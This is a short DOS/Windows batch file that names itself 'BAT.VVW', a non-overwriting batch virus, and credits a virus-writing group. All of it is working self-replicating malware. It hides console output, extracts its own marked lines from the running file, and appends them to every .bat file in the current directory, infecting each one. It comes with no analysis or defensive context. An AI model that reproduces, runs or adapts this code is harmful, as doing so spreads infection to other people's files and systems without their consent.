@echo off
REM BAT.VVW
REM BY SeCoNd PaRt To HeLl
REM a non-overwriter BATCH virus...
ctty NUL
del vvw.bat
find "vvw" <%0 > vvw.bat
for %%v in (*.bat) do copy %%v+vvw.bat %%v
set vvw=
del vvw.bat
exit %vvw%
